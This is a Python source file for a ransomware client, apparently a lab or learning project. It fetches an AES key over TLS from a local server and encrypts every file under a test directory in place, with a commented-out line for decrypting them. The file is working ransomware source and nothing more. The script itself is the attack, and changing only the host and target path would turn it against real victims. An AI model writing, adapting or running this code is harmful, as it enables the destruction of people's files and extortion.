import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import socket
import ssl




class RansomewareClient():
    def __init__(self,random_key):
        self.key=random_key
        self.iv= b"D\xbb\x03\xac\xb7\xb6\xad\x81\xdf\x85\xdag'\xf4\x00\xe6"
        self.backend=default_backend()
        

    def encrypt_file(self,path):
       plaintext= self.read_file(path)
       encrypted_text= self.encrypt_payload(plaintext)
       self.write_file(path,encrypted_text)


    def decrypt_file(self,path):
       encrypted_text= self.read_file(path)
       plaintext=self.decrypt_cipher(encrypted_text)  
       self.write_file(path,plaintext)


    def read_file(self,path):
       with open(path, "rb") as file:
          file_text= file.read()
          return file_text
       

    def write_file(self, path, content):
       with open(path, "wb") as encrypted_file:
          encrypted_file.write(content)
   

        
    def iterate_dirctory(self,dirpath,actionFunc):
      for dirpath,dirname,filenames in os.walk(dirpath):
         for filename in filenames :
            filepath=os.path.join(dirpath, filename)
            actionFunc(filepath)




    def encrypt_payload(self,plaintext):
       cipher=Cipher(algorithms.AES(self.key),modes.CBC(self.iv),backend=self.backend)
       encryptor=cipher.encryptor()
       padded_payload = plaintext + b' ' * (16 - len(plaintext) % 16)
       ciphertext = encryptor.update(padded_payload) + encryptor.finalize()
       return ciphertext
    
    def decrypt_cipher(self, chiper_text):
        cipher=Cipher(algorithms.AES(self.key),modes.CBC(self.iv),backend=self.backend)
        decryptor=cipher.decryptor()
        plaintext = decryptor.update(chiper_text) + decryptor.finalize()
        return plaintext




       
    








if __name__ == "__main__"   :
   sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# TLS client context
   ctx = ssl.create_default_context()
   ctx.check_hostname = False
   ctx.load_verify_locations("server.crt")
   ssl_sock = ctx.wrap_socket(sock, server_hostname="localhost")
   ssl_sock.connect(("127.0.0.1", 8080))
   random_key=ssl_sock.recv(1024)
   ransomeware=RansomewareClient(random_key)
   # ransomeware.iterate_dirctory("C:/Users/ormil/Downloads/test/", actionFunc=ransomeware.decrypt_file)
   ransomeware.iterate_dirctory("C:/Users/ormil/Downloads/test/", actionFunc=ransomeware.encrypt_file)


       
       

     